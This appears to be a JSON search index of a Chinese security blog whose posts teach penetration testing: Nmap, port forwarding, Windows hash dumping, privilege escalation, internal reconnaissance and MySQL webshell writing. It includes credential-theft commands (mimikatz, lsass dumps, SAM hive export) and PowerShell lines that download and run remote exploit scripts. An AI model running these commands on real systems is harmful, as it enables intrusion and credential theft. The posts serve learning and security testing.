{"posts":[{"title":"渗透工具-MSF基础使用","content":"mark ","link":"https://zzggtt.github.io/post/shen-tou-gong-ju-msf-ji-chu-shi-yong/"},{"title":"从mimkatz学习Windows本地hash抓取","content":"mark ","link":"https://zzggtt.github.io/post/cong-mimkatz-xue-xi-windows-ben-di-hash-zhua-qu/"},{"title":"Windows本地认证","content":"mark ","link":"https://zzggtt.github.io/post/windows-ben-di-ren-zheng/"},{"title":"Nmap基础使用","content":"工作原理 Nmap使用TCP/IP协议栈进行工作。 Usage nmap [Scan Type(s)] [Options] {target specification} Target Specification Can pass hostnames, IP addresses, networks, etc. Host Discovery -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host 参数 含义 -sP Ping扫描 -P0 无Ping扫描 -PS/PA/PU/PY TCP SYN/ACK、UDP、SCTP扫描 -PE/PP/PM ICMP echo、timestamp、netmask扫描。 -PR ARP扫描 -sL 列表扫描 -n/-R 禁止/使用DNS反向域名解析 --system-dns 使用系统的域名解析器 --traceroute 路由跟踪 -sP Nmap仅进行ping扫描，然后回显出做响应的主机。使用该选项可以轻易的获取到目标信息而不被发现，是一种非常高效的存活主机扫描方式。 -P0 通常在目标主机禁Ping的情况下使用，也可以绕过某些防火墙。 TCP SYN/ACK TCP协议是TCP/IP协议中面向连接的、可靠的传输层协议。 -PS/PA：nmap会发送一个设置了SYN/ACK标志位的空TCP报文，默认端口为80，也可以指定端口列表（-PS22,23,80,443,3389）。 -PU UDP协议是TCP/IP协议中无连接的传输层协议。 -PU：nmap发送一个空的UDP报文到指定的端口，默认为40125端口。 -PE/PP/PM ICMP是Internet控制报文协议，它是TCP/IP协议族的子协议，工作在网络层。用于在IP主机、路由器之间传递控制消息。 -PE/PP/PM：可以进行ICMP echo、timestamp（时间戳）、netmask（地址掩码）扫描。 -PR ARP即地址解析协议，可根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息。 -PR：nmap会对目标进行一个ARP扫描的过程，在本地局域网中防火墙不会禁止ARP请求。所以在内网存活主机发现时，-PR会比其他扫描更加高效。 -n/-R 禁止/永远 使用DNS反向域名解析。 当我们单纯扫描一个段IP时，使用-n可以大幅度减少目标主机的响应时间，从而更快的得到结果。 如果想知道IP段上存在哪些网站，-R选项更适用。 --system-dns 通常情况下，nmap通过直接发送查询到目标主机上配置的域名服务器来查询域名，为了提高性能，许多请求并发执行。通过--system-dns可以使用系统自带的解析器。 --traceroute 通过路由跟踪，可以看到本地计算机到目标之间所经过的网络节点。 Port Scan PORT SPECIFICATION AND SCAN ORDER: -p &lt;port ranges&gt;: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt; 参数 含义 -p 扫描指定端口 -F 快速扫描有限的端口 -r 随机扫描端口 --top-ports 按最常用的top扫描端口 -p 通过-p选项可以指定扫描的端口： -p22; -p1-65535; 如果想同时扫描TCP和UDP端口，可以通过“T：”、“U：”来指定： -sS -p U:53,111,137,T:21-25,80,139,8080 -F 使用该选项可以快速扫描部分端口，其包含在nmap-services中。 -r 默认情况下nmap是按随机顺序扫描端口的，通过-r选项可以按连续顺序扫描端口。 --top-ports 扫描最常用的top100端口： nmap --top-ports 100 192.168.213.129 --port-ratio 同上，按使用频率进行扫描。 参数 含义 -sS TCP SYN 扫描 -sA TCP ACK 扫描 -sT TCP 扫描 -sU UDP扫描 -sN/sF/sX 隐蔽扫描 -sS TCP SYN扫描被称为半开放式，因为它不打开一个完全的TCP3次握手连接，SYN扫描也可以很明确的区分出端口的开发状态。 因此SYN扫描是一种比较隐蔽且高效的扫描方式。 -sA TCP ACK扫描的缺点很明显，它无法明确是否是开放的还是被过滤的。 -sT TCP连接扫描，通常用于SYN扫描不能使用的情况下。它会在每个端口上完成3次握手扫描，基本不会导致目标主机崩溃。是最基础和稳定的扫描方式。 -sU UDP扫描可以发现更多的可利用端口，因为很多管理员会忽略这些端口。但是由于UDP的扫描是非常慢的，通常需要-p指定端口。 CMS SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively 参数 含义 -sV 端口 服务/版本 --version-intensity 设置扫描强度 --version-light 轻量级扫描 --version-all 重量级扫描 --version-trace 获取详细版本信息 -O 启动操作系统探测 --osscan-limit 对指定的目标进行操作系统探测 --osscan-guess 推测系统识别 -sV 使用-sV选项，可以通过相应的端口和服务，根据服务指纹识别出其相应的版本。 再通过-A可以获取更加详细的信息。 --version-trace 使用--version-trace可以获取详细版本信息，它对于获取目标主机的额外信息非常有帮助。 -O 使用-O选项可以启用操作系统探测： 可以看出由于Windows防火墙的原因，nmap没有确定哪一个版本的操作系统。 SCRIPT SCAN: -sC: equivalent to --script=default --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts --script-args-file=filename: provide NSE script args in a file --script-trace: Show all data sent and received --script-updatedb: Update the script database. --script-help=&lt;Lua scripts&gt;: Show help about scripts.&lt;Lua scripts&gt; is a comma-separated list of script-files or script-categories. IP信息收集： nmap --script ip-geolocation-* www.baidu.com whois信息收集： nmap --script whois www.baidu.com DNS信息收集： nmap --script dns-brute www.baidu.com 系统信息收集： nmap -p 192.168.116.129 --script membase-http-info 系统漏洞扫描（SMB漏洞扫描）： nmap --script smb-check-vulns.nes -p445 192.168.116.129 Output -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,and Grepable format, respectively, to the given filename. -oA &lt;basename&gt;: Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --append-output: Append to rather than clobber specified output files --resume &lt;filename&gt;: Resume an aborted scan --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output ","link":"https://zzggtt.github.io/post/nmap-ji-chu-shi-yong/"},{"title":"渗透基础 - 端口转发与边界代理","content":"端口转发 端口转发: 转发一个网络端口的数据从一个网络节点到另一个网络节点的行为。 应用场景： 在进行渗透时，已拿下内网中一台机器的权限，但是想横向渗透内网中的其他机器时。 Client（攻击者）通过Transit Server（内网中已拿下权限的机器）建立的通道，连接内网Server（内网中其他机器）的指定端口。 正向转发 Client能够正向连接Transit server。Transit server直接转发即可： netsh interface portproxy add v4tov4 listenaddress=192.168.111.132 listenport=7777 connectaddress=192.168.111.103 connectport=4444 nc -lvp 4444 nc -vv 192.168.111.132 7777 反向转发 Client无法正向连接Transit server，但Transit server能够反向连接Client： ew -s lcx_listen -l 2222 -e 1111 ew -s lcx_slave -d 1.1.1.1 -e 1111 -f 10.0.0.2 -g 3389 nc -vv 127.0.0.1 2222 Socks协议 什么是Socks协议？？ 中文意思：防火墙安全会话转换协议，工作在OSI参考模型的第5层（会话层）。 它是一种可以穿透防火墙的协议，很多场景都会用到。比如Fan墙，你们懂得~~ 因为Socks介于传输层与表示层之间，使用TCP协议传输数据，因而不提供如传递ICMP信息之类的网络层相关服务。 目前有两个版本：SOCKS4和SOCKS5 SOCKS4支持TELNET、FTPHTTP等TCP协议； SOCKS5支持TCP与UDP，并支持安全认证方案。 Ps: Socks不支持ICMP，不能使用ping命令。。记住哦~~~ 当然啦，基于socks的转发代理有很多的实用的小工具，少侠看图吧~ 常见的转发工具及不同平台的代理链工具： 代理链工具： proxychains https://howiezhao.github.io/2018/10/18/proxychains/ proxifier https://blog.csdn.net/xhaimail/article/details/98743238 代理 应用场景： 如果Client要对Server的多个端口进行扫描(或是多个Server的多个端口)，逐个配置转发规则很不现实。为了提高效率，这里可以使用代理，配置一次规则即可。 正向代理 Client能够正向连接到Transit server，要对Server1、Server2和Server3的端口进行扫描。 使用EarthWorm： Transit Server： ew –s ssocksd –l 8888 Client使用代理工具连接Transit Server的8888端口，下面通过Windows的代理链工具proxifier演示： 连接Transit Server： 然后配置代理规则，client即可对内网多服务器多端口访问： 反向代理 Client无法正向连接到Transit server，但Transit server能够反向连接到Client 要对Server1、Server2和Server3的端口进行扫描。 使用EarthWorm： Client: ew -s rcsocks -l 2222 -e 1111 Transit server: ew -s rssocks -d 1.1.1.1 -e 1111 使用代理工具连接Client的2222端口，下面通过Linux的代理链工具proxychains演示： Client： //修改配置文件：（设置代理服务器） vim /etc/proxychains.conf socks5 127.0.0.1 2222 //使用：（firefox走代理，访问10.0.0.2） proxychains firefox 10.0.0.2 工具 端口转发 lcx（Windows） lcx是一款轻便的端口转发工具： a、反向转发 外网VPS机器监听： lcx.exe -listen 1111 2222 受害者机器执行： lcx.exe -slave VPSip 1111 127.0.0.1 3389 连接外网VPS机器的2222端口即是连接受害者机器的3389。 b、正向转发 A机器执行： lcx.exe -tran 1111 2.2.2.2 8080 访问A机器的1111端口即是访问2.2.2.2的8080端口。 参考：https://juejin.im/post/6844903954401198088 netsh（只支持TCP协议） netsh是windows自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。 A机器（192.168.130.1）： netsh interface portproxy add v4tov4 listenport=5555 connectport=3389 connectaddress=192.168.1.1 protocol=tcp B机器访问A机器的5555端口，即是192.168.1.1的3389端口 参考：使用netsh进行端口转发 portmap iptables 代理 reGeorg reGeorg是一款开源的socks代理软件，可以解决当机器不出网时，把内网服务器的端口通过http/https隧道转发到本机。 参考： 配置reGeorg+Proxifier渗透内网 reGeorg+Proxifier使用 Earthworm 跨平台+端口转发+socket代理结合体 http://rootkiter.com/EarthWorm/ https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA goproxy go实现的高性能http,https,websocket,tcp,udp,socks5,ss代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转 下载地址： https://github.com/snail007/goproxy/ Transit server: proxy socks -t tcp -p &quot;0.0.0.0:8888&quot; ssh xsocks 参考： 渗透基础-端口转发与代理 内网渗透之代理转发 ","link":"https://zzggtt.github.io/post/shen-tou-ji-chu-duan-kou-zhuan-fa-yu-bian-jie-dai-li/"},{"title":"window本地认证与hash抓取","content":"Windows本地认证 登陆到本机的过程： 用户首先按Ctrl+Alt+Del组合键。 Winlogon检测到用户按下SAS键，就调用GINA，由GINA显示登录对话框，以便用户输入账号和密码。 用户输入账号和密码，确定后，GINA把信息发送给LSA进行验证。 在用户登录到本机的情况下，LSA会调用Msv1_0.dll这个验证程序包，将用户信息处理后生成密钥，同SAM数据库中存储的密钥进行对比。 如果对比后发现用户有效，SAM会将用户的SID，用户所属用户组的SID，和其他一些相关信息发送给LSA。 LSA将收到的SID信息创建安全访问令牌，然后将令牌的句柄和登录信息发送给Winlogon.exe。 Winlogon.exe对用户登录稍作处理后，完成整个登录过程。 可以看出本地用户的密码是存储在SAM文件中。它用于储存本地所有用户的凭证信息，位于：C:\\Windows\\System32\\config\\sam。 Windows不会存储文明密码的，而是存储密码的hash值，上诉第四步中所说的密钥就是密码hash。 参考： Windows本地登陆 渗透技巧——Windows中Credential Manager的信息获取 由Windows本地认证到Hash抓取 Windows hash 2000 xp 2003 Vista win7 2008 2012 LM √ √ √ NTLM √ √ √ √ √ √ √ Windows使用的hash有：LMHASH和NTLMHASH。 LM HASH lmhash作为Windows早期使用的密码hash，其加密流程如下： 1、密码长度限制为14个字符 2、密码全部转换为大写 3、密码转换为16进制字符串，不足14字节用0补全 4、密码的16进制字符串被分成两个7byte部分 5、再分7bit为一组,每组末尾加0，再组成一组 6、上步骤得到的二组，分别作为key 为 “KGS!@#$%”进行DES加密。 7、将加密后的两组拼接在一起，得到最终LM HASH值。 NTLM HASH 为了解决lmhash强度不够的问题，微软推出了ntlmhash，其加密流程如下： 1、先将用户密码转换为十六进制格式。 2、将十六进制格式的密码进行Unicode编码。 3、使用MD4对Unicode编码数据进行Hash计算 其格式如下： username:SID:LM-Hash:NTLM-Hash Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是aad3b435b51404eeaad3b435b51404ee（这表示空密码或者是未使用LM_HASH） 在hash传递攻击时，可以替换成0： 00000000000000000000000000000000 参考： 红蓝对抗之Windows内网渗透 从零开始学内网渗透 本地hash抓取 mimikatz 只能抓取登陆过的用户hash，无法抓取所有用户，需要免杀： meterpreter中直抓取内存中的hash： mimikatz_command -f samdump::hashes meterpreter中直抓取内存中的明文密码： mimikatz_command -f sekurlsa::logonpasswords 非交互式抓明文密码(webshell中) mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &gt; pssword.txt powershell加载mimikatz抓取密码 powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz MSF中mimikatz使用参考：https://blog.csdn.net/weixin_45116657/article/details/103147716 reg Win2000和XP需要先提到SYSTEM，03开始直接可以reg save，导出的文件大，效率低，但是可以绕过杀软。 在meterpreter中使用shell命令来到交互式cmd，然后导出注册表： （在c盘下就导出了三个注册表文件） reg save hklm\\sam sam.hive reg save hklm\\system system.hive reg save hklm\\security security.hive 使用meterpreter下自带download功能来将目标机的三个注册表文件下载下来， 然后本地分析： （默认使用kali） python /root/impacket/examples/secretsdump.py ‐sam sam.hiv ‐security security.hiv ‐system sys.hiv LOCAL 参考：https://blog.csdn.net/qq_17204441/article/details/89426390 ProcDump + Mimikatz 本地分析，文件会比较大，但是能绕过杀软。 通过procdump（下载地址）导出注册表： Procdump.exe -accepteula -ma lsass.exe lsass.dmp 然后通过mimikatz进行读取： sekurlsa::minidump lsass.dump.dmp sekurlsa::logonpasswords full PS：mimikatz的平台要与进行dump的系统(source dump)兼容(比如dowm了08的,本地就要用08系统来分析) ","link":"https://zzggtt.github.io/post/window-ben-di-ren-zheng-yu-hash-zhua-qu/"},{"title":"Windows下提权","content":"Windows权限 在Windows中，权限精确的定制了用户对资源的访问控制能力。也就是说，权限是以资源为对象，即某个资源对哪些用户可以拥有哪些权限。 安全标识符 在Windows中系统通过安全标识符（SID）对用户进行识别，SID可应用于系统内的所有用户、组、服务或计算机。SID具有唯一性。 访问控制列表 访问控制列表（ACL）是权限的核心技术，用于规定用户对资源的访问权限。在访问控制列表中，每一个用户或用户组都对应一组访问控制项（Access Control Entry，ACE），所有用户或用户组的权限访问设置都将会在这里被存储下来，并允许随时被有权限进行修改的用户进行调整，如取消某个用户对某个资源的&quot;写入&quot;权限。 安全主体 在Windows中，可以将用户、用户组、计算机或服务都看成是一个安全主体，每个安全主体都拥有相对应的账户名称和SID。根据系统架构的不同，账户的管理方式也有所不同──本地账户被本地的SAM管理，域的账户则会被域控制器进行管理。 一般来说，权限的指派过程实际上就是为某个资源指定安全主体（即用户、用户组等）可以拥有怎样的操作过程。 参考资料： Windows之权限讲解 Windows用户和组 Windows 内置用户账户： 权限 详细 User 普通用户权限 Administrator 管理员权限。通常需要通过机制再提升为system权限来操作SAM（Mimikatz抓密码） System 系统权限。可以操作SAM，需要从Administrator提升到SAM才能对散列值Dump TrustedInstaller 最高权限，可以操作系统文件 内核漏洞提权 将目标主机补丁号导出： systeminfo &gt; 1.txt 或 wmic qfe get Caption,Description,HotFixID,InstalledOn &gt; 1.txt 通过脚本判断是否存在未打补丁的漏洞： https://github.com/bitsadmin/wesng.git https://github.com/AonCyberLabs/Windows-Exploit-Suggester 或根据在线网站检测： https://bugs.hacking8.com/tiquan 下载对应的EXP，并执行利用： https://www.exploit-db.com/ 可能遇到的问题：EXP被杀。将EXP改成Powershell，使用powershell下载利用代码并执行： Powershell IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X:8000/ms16-032.ps1');Invoke-MS16-032 参考： https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html https://www.cnblogs.com/xiaozi/p/13534602.html DLL劫持提权 基础介绍 DLL是Microsoft引入的，用于实现共享库的概念。它是一个库文件，代表动态链接库，其中包含可被多个应用程序同时动态访问和使用的代码和数据。 Windows2003以上以及win7以上操作系统（其他系统版本参考），通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序启动时所要调用的DLL的路径，之后应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。 应用程序动态访问DLL的搜索目录顺序： 从应用程序的目录中加载 32位系统目录（C：\\ Windows \\ System32） 16位系统目录（C：\\ Windows \\ System） Windows目录（C：\\ Windows） 当前工作目录（CWD） PATH环境变量中的目录（首先是系统，然后是用户） KnownDLLs注册表项机制：凡是此项下的DLL文件就会被禁止从应用程序自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用。 注册表位置： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs 利用条件： DLL 可以看出，如果存在DLL即不在KnownDLLs里，开发人员也没有定义绝对路径时，应用程序就会按照目录顺序去搜索。 权限 当前用户有权限对要劫持的DLL目录进行读写操作。 在上述条件下，我们就可以在应用程序搜索到system32之前，也就是应用程序目录中，放入我们编写好的恶意劫持DLL，等待应用程序调用。 利用过程： 参考倾旋师傅的文章：QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权 错误的服务权限配置 基础介绍 通常情况下，一些Web控件、网络客户端会在本地计算机中注册一些服务，这些服务在开机后自启动，而自启动的权限又是SYSTEM。 在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services 服务在开机后自启动时，Windows将会搜索要执行的二进制文件。并在binPath属性中声明要执行的二进制文件的位置。如果二进制文件的路径不是一个绝对路径时，Windows将从路径开头的所有文件夹中进行搜索。 例如binPath路径如下： C:\\Program Files\\Unquoted Path Service\\Common Files\\service.exe 则搜索顺序为： C:\\Program.exe C:\\Program Files\\Unquoted.exe C:\\Program Files\\Unquoted Path.exe C:\\Program Files\\Unquoted Path Service\\Common.exe C:\\Program Files\\Unquoted Path Service\\Common Files\\service.exe 利用条件： 若服务注册表的修改权限当前用户可控，那就可以直接修改binPath的值，指向到本地其他路径，获得这个服务的权限。 若这个binPath所指向的目录权限可控，那么我们也可以把二进制文件替换成木马，从而当服务启动的时候，就能够执行我们的木马。 若binPath的值不是一个绝对路径时，可以通过Windows的特性（按搜索顺序查找二进制文件）来提权：将木马放置在带有空格目录的同级目录下，当服务启动时，会首先在空格目录当前目录搜索第一个单词的二进制文件。 利用过程： 首先需要在找到存在配置权限错误的服务，PowerUp和winPEAS是最有用的工具，PowerUp用PowerShell编写，而winPEAS用C＃编写。将需要.NET Framework 4.0来运行winPEAS： https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS 关于Powerup的使用：Powrshell 提权框架-Powerup 接下来上传我们的木马，重启服务，即可获得该服务权限。 实际操作流程可参考： Windows本地提权提升技巧 Escalate Privileges in windows 红队测试之Windows提权小结 Mysql提权 搬运一下先知上总结好的文章： Windows下三种mysql提权剖析 mysql数据库漏洞利用及提权方式小结 协议提权（Potato） 土豆太多了，先mark一下，后面有时间再吃： Hot Potato 利用已知的Windows中的问题，以获得本地权限提升。 其中利用NTML中继（特别是基于HTTP &gt; SMB中继）和NBNS欺骗进行提权。 Windows提权姿势之Hot Potato Rotten Potato The lonely potato Juicy Potato Windows本地提权工具Juicy Potato测试分析 Ghost Potato Ghost Potato 复现(Cve-2019-1384) Pipe Potato pipePotato复现 pipePotato：一种新型的通用提权漏洞 Potato家族本地提权细节 https://xz.aliyun.com/t/7776 ","link":"https://zzggtt.github.io/post/windows-xia-ti-quan/"},{"title":"如何进行内网信息搜索","content":"前言 从亮神分享的文章中学到了很多，记录了下来： 目标资产信息搜集的程度，决定渗透过程的复杂程度。 目标主机信息搜集的深度，决定后渗透权限持续把控。 渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。 ——Micropoor 一次完整的网络渗透，不仅仅是与目标管理人员的权限争夺，一次完整的网络渗透，它分为两大块，技 术业务与信息分析业务。 而技术业务要辅助并且要为信息分析业务提供强大的支撑与保证。同时信息分析业务要为技术业务提供 关键的目标信息分析逻辑关系与渗透方向。 在得到一个webshell时，非root/administrator权限的情况下，对目标信息搜集至关重要，它会影响到后期的渗透是否顺利，以及渗透方向。 主机信息 查询用户信息： 了解当前用户权限，判断是否需要进一步提升权限。 win： whoami：显示当前用户信息 net user：显示主机系统中所有用户信息 linux： whoami id cat /etc/shadow、cat /etc/passwd 查询网络信息： 确认目标主机所连接的网络情况： win： TCP/IP配置：ipconfig、ipconfig /all 端口：netstat -ano ARP表：arp -a 路由表: route print dns缓存记录：ipconfig/displaydns linux： ifconfig、netstat -anplt ARP表:arp -a 路由表:route -n 查看登录日志获取登录来源ip：lastlog 查询系统信息： 确认主机操作系统名称和版本信息 win: systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; Linux: uname -a ：通过查看内核版本 查询补丁更新信息： 获取当前主机补丁更新情况，可用来辅助提升权限。 win： systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn Linux: uname -a ：通过查看内核版本 查询进程列表： 查看当前进程列表，重点关注安全软件，为了后续免杀做准备。 win： tasklist wmic process list brief linux: ps top 注：要熟悉国内常见点杀软。 查询安装的软件及版本、路径等 win: wmic product get name,version &gt; ins.txt : 通过wmic将命令信息导出 powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot; ：通过powershell命令收集软件的版本信息 linux: rpm -q：来查询安装了哪些软件包 查询主机服务信息 wmic service list brief 资产信息 服务器端存有敏感信息，通过收集各种登录凭证以便扩大战果。 Windows： 本地密码Hash和明文密码/抓取浏览器密码/服务端明文密码 linux： history记录敏感操作/shadow文件破解/mimipenguin抓取密码/使用Strace收集登录凭证/全盘搜索敏感信息 域内信息收集 搜集完本机相关信息后，就需要判断当前主机是否在域内，如果在域内，就需要进一步收集域内信息 判断是否有域 一般域服务器都会同时作为时间服务器，所以使用下面命令判断： 运行 net time /domain 该命令后，一般会有如下三种情况: 1、存在域，但当前用户不是域用户，提示说明权限不够 C:\\Users&gt;WWW&gt;net time /domain System error 5 has occurred. Access is denied. 2、存在域，并且当前用户是域用户 C:\\Windows\\system32&gt;net time /domain Current time at \\\\owa.god.org is 2020/11/12 16:05:49 The command completed successfully. 3、当前网络环境为工作组，不存在域 C:\\Users\\Administrator&gt;net time /domain The domain controller for the domain WORKGROUP could not be found. 域用户信息搜集： net user /domain //获取域用户列表 net group /domain //查询域内所有用户组列表 net group “Domain Admins” /domain //查询“域管理员组用户”列表 net group &quot;Domain Controllers&quot; /domain //查看“域控制器组”用户 net localgroup administrators /domain //查询“本地管理员组”用户 正如上面所说，技术业务需要辅助分析业务。在域组中，其中有几个组需要特别关注，在一般的大型内 网渗透中，需要关注大致几个组 （1）IT组/研发组 他们掌握在大量的内网密码，数据库密码等。 （2）秘书组 他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业 务来确定渗透方向 （3）domain admins组 root/administrator （4）财务组 他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组 织的整体架构 （5）CXX组 ceo cto coo等，不同的目标组织名字不同，如部长，厂长，经理等。 以xxx组为例：xxx组共计x人。 并且开始规划信息刺探等级： 等级1：确定某部门具体人员数量 如研发中心4人 等级2：确定该部门的英文用户名的具体信息，如姓名，联系方式，邮箱，职务等。以便确定下一步攻 击方向 等级3：分别刺探白天/夜间 内网中所存活机器并且对应IP地址 等级4： 对应人员的工作机内网IP，以及工作时间 等级5： 根据信息业务反馈，制定目标安全时间，以便拖拽指定人员文件，或登录目标机器 等级6： 制定目标机器后渗透与持续渗透的方式以及后门 以上只是思路，后续内容可就不搬运了，详细内容可直接去GitHub：渗透的本质是信息收集 找到域控 一般来说，域控服务器IP地址为DNS服务器地址，找到DNS服务器地址就可以定位域控 nslookup/ping 域名,解析到域控服务器IP地址 参考链接 内网信息收集之本机信息收集 如何进行内网信息收集 渗透的本质是信息收集（第五十二课） ","link":"https://zzggtt.github.io/post/ru-he-jin-xing-nei-wang-xin-xi-sou-suo/"},{"title":"域环境搭建","content":"前言 本想记录一下搭建域环境的学习过程，但是发现倾旋师傅的文章最快的方式搭建域环境写的非常详细，于是准备写一写有关于域的相关基础知识。 域和工作组 工作组 工作组是最简单的Windows资源管理模式，它具有分布式管理功能。每个用户独立的管理自己的计算机，只能在其计算机上使用其登陆凭证进行登录。大多数存储是分布式的。每个设备都有自己的专用存储。 域 域是客户端/服务器的网络资源管理模式，具有集中管理功能。用户使用其登陆凭证可以在域中的任何设备登录，所有设备都可以在集中设备（DC）上进行管理，所有用户数据都集中存储。 区别： 序号 域 工作组 1、 域中的计算机具有集中式数据库。 工作组中的计算机主要具有自己的本地数据库。 2、 域主要是仅传输和共享敏感的重要数据。 工作组仅由于安全性较低而用于共享安全性和个人数据较少的内容。 3、 域主要是大型公共和企业网络的首选。 工作组主要是小型局域网的首选，例如学校，学院，建筑物等。 4、 由于安全性，域用于传输和共享敏感的重要数据。 由于安全性较低，工作组用于共享个人数据。 5、 域对于大量设备可以更好地工作。 工作组对较少的计算机更好地工作。 6、 域名由域控制器根据IP地址提供。 在工作组中，没有任何依赖于硬件组件和服务器的名称分配。 7、 可以从集中式存储中的域中恢复数据。 由于每个设备的本地存储，因此无法在工作组中进行数据恢复。 8、 可以使用一个或多个不同网络域的设备并向其中添加所有预期的设备来形成域。 同一网络中的设备只能添加到工作组中。 DC（Domain Controller） 在域管理模式下，负责响应Windows Server域中的安全身份验证请求的服务器称为“域控制器（Domain Controller，简写为DC）。网络管理员通过在域控制器上集中管理大量的pc机。 域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。 AD（Active Directory） Active Directory（AD）是Microsoft专有的目录服务。它在Windows Server上运行，用于管理网络上的设备和资源。 目录是一种分层结构，用于存储有关网络上对象的信息。而目录服务，例如Active Directory域服务（AD DS），提供了用于存储目录数据，并使网络用户和管理员可以使用此数据的方法。 域内所有的计算机共享一个集中式的目录数据库（又称为AD数据库），它包含着整个域内的对象（用户账户、计算机账户、打印机、共享文件等）和安全信息等等，而活动目录负责目录数据库的操作（增删修改）。 所以建立域控制器服务器的过程，其实就是安装AD的过程。 域、树、林、组织单位 Active Directory域服务使用由域，树和林组成的分层布局来协调网络元素。 域 域是一组对象。如用户或设备，共享相同AD数据库。域具有域名系统（DNS）结构。 树 树是是组合在一起的一个或多个域。树结构使用连续的名称空间来收集逻辑层次结构中的域集合。可以将树视为信任关系，其中在两个域之间共享安全连接或信任。 林 林是有一棵或多棵域树组成的，每棵域树独享连续的命名空间，不同域树之间没有命名空间的连续性。林中第一棵域树的根域也整个林的根域，同时也是林的名称。 组织单位 组织用户，组和设备。每个域可以包含自己的OU。但是，OU不能具有单独的名称空间，因为域中的每个用户或对象都必须是唯一的。例如，无法创建具有相同用户名的用户帐户。 参考链接： https://www.geeksforgeeks.org/difference-between-domain-and-workgroup/ https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview https://blog.csdn.net/qq_39101049/article/details/99678671 ","link":"https://zzggtt.github.io/post/nei-wang-shen-tou-ji-chu/"},{"title":"Mysql注入点写Webshell","content":"基础知识 指令基础 在 MySQL 中，可以使用 SELECTI...INTO OUTFILE 语句，将表的数据导出成一个文件。 语法格式如下： SELECT 列名 FROM table [WHERE 语句] INTO OUTFILE '目标文件'[OPTIONS] SELECT语句查询出所需数据，然后将其导出到目标文件中，OPTIONS为可选参数，常用值如下： FIELDS TERMINATED BY '字符串'：为字段之间设置字符串作为分隔符 COLUMNS TERMINATED BY '字符串'：为列之间设置字符串作为分隔符 LINES TERMINATED BY '字符串'：为每行数据结尾设置字符串 LINES STARTING BY '字符串'：为每行数据开头设置字符串 环境条件 注入点：select注入点 数据库用户：File权限 secure_file_priv：支持web目录文件导出 物理路径：'G:/Tools/phpstudy_pro/WWW/sqli-labs/' 数据库和Web服务器在同一台服务器上 File权限 指的是数据库用户能否对服务器主机上的文件进行读写操作，这样才可以执行select into outfile，load data infile操作。 secure_file_priv secure-file-priv是mysql的新特性，用来限制对读写文件的权限，即规定了select into outfile，load data infile操作的目录。 通过以下命令可以查看secure-file-priv的值： SHOW 